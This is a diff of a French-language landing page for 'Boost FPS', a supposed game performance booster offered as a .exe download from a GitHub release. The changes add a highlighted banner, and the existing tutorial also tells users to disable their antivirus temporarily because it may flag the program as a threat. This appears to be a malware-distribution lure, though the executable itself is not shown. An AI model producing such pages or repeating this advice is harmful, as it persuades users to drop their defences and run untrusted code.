@@ -31,7 +31,7 @@
         }
 
         header {
-            background: linear-gradient(135deg, #ff6f61, #ff6f61, #ffbc42);
+            background: linear-gradient(135deg, #ff6f61, #ffbc42);
             color: #fff;
             padding: 40px 0;
             text-align: center;
@@ -62,6 +62,17 @@
             background: #ff6f61;
         }
 
+        .warning {
+            background-color: #ffeb3b;
+            color: #333;
+            padding: 15px;
+            text-align: center;
+            font-size: 1em;
+            font-weight: bold;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+
         .section {
             display: none;
             padding: 20px;
@@ -85,7 +96,6 @@
             text-decoration: none;
             border-radius: 30px;
             transition: background-color 0.3s ease, transform 0.3s ease;
-            animation: pulse 1.5s infinite;
         }
 
         .download-button:hover {
@@ -108,12 +118,58 @@
             text-decoration: underline;
         }
 
+        .more-info {
+            background: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 90%;
+            max-width: 500px;
+            display: none;
+            z-index: 1000;
+        }
+
+        .more-info.active {
+            display: block;
+        }
+
+        .close-button {
+            background: #ff4c3b;
+            color: #fff;
+            border: none;
+            padding: 10px 15px;
+            font-size: 1em;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-top: 10px;
+        }
+
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 900;
+        }
+
+        .overlay.active {
+            display: block;
+        }
+
         footer {
             background-color: #333;
             color: #fff;
-            padding: 15px 0;
+            padding: 15px;
             text-align: center;
-            margin-top: 20px;
+            font-size: 0.9em;
+            margin-top: 30px;
         }
     </style>
 </head>
@@ -128,17 +184,29 @@
 
     <nav>
         <a href="#" onclick="showSection('home')">Accueil</a>
+        <a href="#" onclick="showSection('support')">Support</a>
         <a href="#" onclick="showSection('version')">Version</a>
         <a href="#" onclick="showSection('tuto')">Tutoriel</a>
-        <a href="#" onclick="showSection('contact')">Contact Support</a>
     </nav>
 
     <div class="container">
+        <div class="warning">
+            ⚠️ **Attention** : Certains antivirus peuvent détecter Boost FPS comme une menace. Désactivez temporairement votre antivirus si nécessaire.
+        </div>
+
         <section id="home" class="section active">
             <h2>Optimise ton expérience de jeu</h2>
             <p>Boost FPS t'offre une expérience fluide et performante. Télécharge maintenant !</p>
-            
             <a href="https://github.com/seyzperly572/New/releases/download/boostfps/boostfps2.0.exe" download="boostfps2.0.exe" class="download-button">Télécharger</a>
+            <br><br>
+            <button class="download-button" onclick="showMoreInfo()">En savoir plus</button>
+        </section>
+
+        <section id="support" class="section">
+            <h2>Support & Contact</h2>
+            <p>Si tu as un problème, contacte-nous :</p>
+            <p>Email : <a href="mailto:studio-booster@gmail.com">studio-booster@gmail.com</a></p>
+            <p>Discord : <a href="https://discord.gg/gdk29Aac" target="_blank">Rejoindre le serveur</a></p>
         </section>
 
         <section id="version" class="section">
@@ -152,19 +220,18 @@
             <p>2. Désactive ton antivirus temporairement si nécessaire.</p>
             <p>3. Lance l'installation et suis les instructions.</p>
         </section>
+    </div>
 
-        <section id="contact" class="section">
-            <h2>Contact Support</h2>
-            <p>Si tu as besoin d'aide, n'hésite pas à nous contacter :</p>
-            <div class="contact-info">
-                📧 Email : <a href="mailto:studio-booster@gmail.com">studio-booster@gmail.com</a><br>
-                🔗 Discord : <a href="https://discord.gg/gdk29Aac" target="_blank">Rejoindre le serveur</a>
-            </div>
-        </section>
+    <div class="overlay" id="overlay"></div>
+
+    <div class="more-info" id="moreInfo">
+        <h2>À propos de Boost FPS</h2>
+        <p>Boost FPS optimise les performances de ton PC en fermant les processus inutiles et en optimisant la RAM.</p>
+        <button class="close-button" onclick="closeMoreInfo()">Fermer</button>
     </div>
 
     <footer>
-        <p>&copy; 2025 Boost FPS. Optimise tes jeux maintenant !</p>
+        &copy; 2025 Boost FPS. Optimise tes jeux maintenant !
     </footer>
 
     <script>
@@ -173,6 +240,16 @@
                 section.classList.remove('active');
             });
             document.getElementById(sectionId).classList.add('active');
+        }
+
+        function showMoreInfo() {
+            document.getElementById("moreInfo").classList.add("active");
+            document.getElementById("overlay").classList.add("active");
+        }
+
+        function closeMoreInfo() {
+            document.getElementById("moreInfo").classList.remove("active");
+            document.getElementById("overlay").classList.remove("active");
         }
     </script>
 
